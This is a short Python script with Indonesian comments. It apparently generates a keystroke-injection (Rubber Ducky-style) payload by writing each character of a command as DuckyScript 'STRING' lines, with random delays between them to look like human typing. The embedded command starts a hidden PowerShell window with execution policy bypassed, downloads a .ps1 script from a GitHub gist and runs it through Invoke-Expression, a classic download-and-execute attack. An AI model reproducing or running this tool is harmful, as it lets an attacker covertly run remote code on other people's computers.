import random
import sys

# String yang ingin diketikkan
input_string = "powershell -W Hidden -Exec Bypass $a = Invoke-WebRequest https://gist.githubusercontent.com/satoebintang/0a8165ed5a587496d6bd7198749890e5/raw/7b171f9a4fb372d4eb962d8b86cac9c35bd52127/ujivalidasi.ps1; Invoke-Expression $a"

# Iterasi melalui setiap karakter dalam string
for char in input_string:
    # Mendapatkan nilai penundaan acak antara 50ms dan 100ms
    delay = random.randint(50, 100)
    
    # Menulis karakter
    sys.stdout.write("DELAY " + str(delay) + "\n")
    sys.stdout.write("STRING " + char + "\n")
